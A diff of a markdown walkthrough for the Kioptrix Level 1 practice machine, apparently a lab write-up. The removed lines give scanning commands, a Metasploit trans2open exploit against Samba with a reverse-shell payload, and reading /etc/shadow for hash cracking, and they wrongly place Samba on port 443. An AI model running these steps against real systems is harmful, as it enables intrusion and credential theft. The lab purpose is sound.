@@ -1,101 +1,17 @@
-# Objective
+# Kioptrix Level 1 - RCE Walkthrough
 
-To gain root access to the system.
+## Objective
 
----
+To gain root-level access to a target system (Kioptrix Level 1) by identifying vulnerabilities, exploiting misconfigurations, and performing post-exploitation analysis.
 
-## Stage 1: Identifying All Possible Exploits
+## Situation
 
-### Step 1: Identifying the Compromised System on the Network
-- **Command:**
-  ```bash
-  sudo netdiscover -P -r <IP>
-  ```
+The target system is discovered on a local network and suspected to be vulnerable due to outdated services. The goal is to enumerate the system, identify exploitable services, and leverage known vulnerabilities to achieve full system compromise.
 
----
+## Task
 
-### Step 2: Running a Port Scan
-- **Command:**
-  ```bash
-  sudo nmap -A -T4 -p- <Target_IP>
-  ```
-- **Findings:**
-  - Multiple open ports and their services:
-    - **Port 22:** SSH
-    - **Port 80:** Apache 1.3 File server
-    - **Port 139:** Samba
-    - **Port 443:** OpenSSL
-
----
-
-## Stage 2: Exploiting Identified Vulnerabilities
-
-### Step 1: Targeting Samba on Port 443 with Metasploit
-- **Actions:**
-  - Identify Samba version
-  - Search for relevant exploit in Metasploit
-- **Commands:**
-  ```bash
-  msfconsole
-  search smb_version
-  # Set up rhosts and port, then run
-  ```
-- **Findings:**
-  - Samba version identified as 2.2.1a
-
----
-
-### Step 2: Looking Up Exploits for Samba 2.2
-- **Command:**
-  ```bash
-  searchsploit samba 2.2
-  ```
-- **Findings:**
-  - Use `exploit/linux/samba/trans2open`
-
----
-
-### Step 3: Setting Up a Reverse Shell Payload
-- **Note:**
-  - A reverse shell (connect-back) requires the attacker to set up a listener. The target connects back, giving the attacker a shell.
-- **Commands:**
-  ```bash
-  use exploit/linux/samba/trans2open
-  set rhosts <Target_IP>
-  set payload linux/x86/shell_reverse_tcp
-  run
-  ```
-
----
-
-## Stage 3: Gaining Root Access
-
-### Step 1: Performing Enumeration
-- **Commands:**
-  ```bash
-  whoami      # Find the current user
-  id          # Check account's access level (0 = root)
-  sudo -l     # List commands that can be run as root
-  ```
-- **Findings:**
-  - Root access obtained; unrestricted access to system files.
-
----
-
-### Step 3: Post-Exploitation - Credential Extraction
-- **Actions:**
-  - Extract credentials/encrypted passwords from `/etc/shadow`
-  - Extract user details from `/etc/passwd`
-  - Identify password encryption type and use tools like Hashcat for attacks
-- **Commands:**
-  ```bash
-  cat /etc/shadow
-  cat /etc/passwd
-  ```
-
----
-
-## References
-- [Kioptrix Level 1 Walkthrough - Exploiting Apache mod_ssl Privilege Escalation](https://medium.com/@cipher0x00/kioptrix-level-1-walkthrough-exploiting-apache-mod-ssl-privilege-escalation-66bba328b349)
-- [How to Use a Reverse Shell in Metasploit](https://adfoster-r7.github.io/metasploit-framework/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html)
-- [OpenLuck Exploit](https://github.com/heltonWernik/OpenLuck)
+- Identify the compromised system on the network
+- Enumerate open ports and running services
+- Research and exploit known vulnerabilities
+- Gain root access to the system
+- Perform post-exploitation activities such as credential extraction
